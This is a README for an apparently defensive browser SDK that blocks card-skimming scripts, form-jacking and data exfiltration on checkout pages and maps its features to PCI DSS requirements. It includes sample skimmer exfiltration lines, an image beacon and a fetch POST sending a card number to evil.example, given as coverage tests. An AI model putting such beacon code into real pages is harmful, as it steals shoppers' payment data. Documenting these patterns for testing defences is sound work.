# Nemesis Shield - Browser (client-side, checkout-grade)

Runtime protection for the **front-end** - the layer a WAF and a backend SDK can't see. Built for
**checkout, payment, and e-commerce pages**, where a single injected script silently steals card data
in the browser before it ever reaches your server. It learns your page's normal client-side behavior
and enforces a per-app allow-list you curate in the console.

## What it does

**BLOCKS (prevents the attack)**
- **Data exfiltration** to un-approved origins across **every channel a skimmer uses** - `fetch`,
  `XMLHttpRequest`, `sendBeacon`, **image beacons** (`new Image().src="//evil/?cc=…"`), **WebSocket**,
  and **EventSource**. Even if a skimmer runs, the stolen card data **cannot leave**.
- **Magecart / sideloaded scripts & iframes** injected from an origin the page never normally loads.
- **Form-jacking** - a form (a payment form especially) re-pointed to submit to an attacker.

**DETECTS + ALERTS** (reports a finding - you can't always prevent these, but you're told immediately)
- Inline `<script>` injection or change (content fingerprint not in the approved inventory).
- Hidden input fields injected into a payment form (overlay skimmer).
- **Clickjacking** - the page rendered inside an un-approved frame ancestor (optional `frameBust`).

**INVENTORY**
- Every external script origin and every inline-script fingerprint is reported to the console.

## PCI DSS 4.0.1 - §6.4.3 & §11.6.1

Mandatory for payment pages since **31 March 2025**, these requirements exist specifically for the
Magecart class. This SDK maps directly to them:

| Requirement | How this SDK satisfies it |
|---|---|
| **6.4.3** - *authorize* each script, *ensure integrity*, keep an *inventory* | Console approval workflow (authorize) + inline fingerprints & origin allow-list (integrity) + every script reported (inventory) |
| **11.6.1** - *detect & alert* on unauthorized change to scripts / payment-page content | Enforce blocks off-baseline scripts and exfil; inline-script/field-injection changes raise findings with timely alerting |

## Install

**Drop-in `<script>`** - any site, including server-rendered, jQuery, or legacy apps:
```html
<script src="nemesis-shield.js" data-token="nsk_your_app_token"></script>
```

**Bundled app** (React / Vue / Angular) - once at bootstrap, before render:
```js
import NemesisShield from "@nemesis-shield-autogon/browser";
NemesisShield.init({ token: import.meta.env.VITE_NEMESIS_TOKEN, frameBust: true });
```
- **React** → top of `main.tsx` / `index.js`. **Angular** → `main.ts` before bootstrap. **Vue** →
  `main.js` before `mount()`. **jQuery / Angular.js / raw JS** → the `<script>` tag (first in `<head>`).

One SDK for every framework - they all share the same browser primitives. `frameBust` (default off)
redirects out of an un-approved frame; leave it off if you legitimately embed your page.

## Docs & links

Want more than the snippet? Full source, every hooked channel, options, and examples:

| Topic | Detailed guide & source |
|---|---|
| Full SDK source (all channels) | [nemesis-shield.js](https://github.com/eobi/nemesis_shield_sdks/blob/main/browser/nemesis-shield.js) |
| `init()` options & types | [index.d.ts](https://github.com/eobi/nemesis_shield_sdks/blob/main/browser/index.d.ts) |
| Runnable examples & tests | [browser/tests](https://github.com/eobi/nemesis_shield_sdks/tree/main/browser/tests) |

- **Full docs & source:** https://github.com/eobi/nemesis_shield_sdks/tree/main/browser
- **Website & console:** https://shield.nemesislabs.xyz

## How enforcement works

1. **Observe** (default) - records origins of scripts loaded, endpoints called (all channels), form
   targets, and the script inventory (origins + fingerprints only - never payloads, cookies, or DOM).
2. **Approve** - review learned client-side behaviors in the console; approve your CDN, PSP (Stripe…),
   analytics. Auto-approved during the learning window.
3. **Enforce** - flip to enforce. Anything off-baseline is blocked (or, for inline/field/frame,
   alerted) and reported. No redeploy - the SDK re-polls the policy.

## Verified

Real checkout E2E against production: after learning `api.stripe.com`, `js.stripe.com`, and
`google-analytics.com` and flipping to enforce, the live SDK **allowed** those + first-party and
**blocked** an image-beacon exfil (`evil-skimmer.ru`), a WebSocket exfil (`wss://exfil.ru`), a
Magecart script (`evil-cdn.ru`), a payment form-jack (`phish-pay.ru`), and a clickjack frame
(`clickjack.ru`). Unit tests (`node test.cjs`): 7/7, including the live image-beacon and WebSocket
hooks.

## Full coverage & safe-unlock

Load the `<script>` **first in `<head>`**, before any third-party tag, so every client-side channel is wrapped from the start. It covers **every exfil / code-load channel** a skimmer uses:

`fetch` · `XMLHttpRequest` · `sendBeacon` · **Image beacons** (property *and* `setAttribute`) · `WebSocket` · `EventSource` · **`Worker` / `SharedWorker` / `ServiceWorker`** · `<script>` / `<iframe>` injection · **`<link rel=preload/prefetch>`** · `<img srcset>` · **`<a ping>`** · form-jacking · clickjacking - including resources re-pointed by attribute mutation.

Blocking is by destination **origin** (a learned allow-list - like a CSP you curate in the console). First-party is always allowed; off-baseline third-party exfil is blocked in enforce mode. Fail-open, never breaks the page.

**Verify coverage** - simulate a skimmer beacon and confirm the console records/blocks it:

```js
new Image().src = "https://evil.example/?cc=4111111111111111"; // off-baseline origin → blocked in enforce
fetch("https://evil.example/steal", { method: "POST", body: "cc=..." }).catch(() => {}); // rejected
```
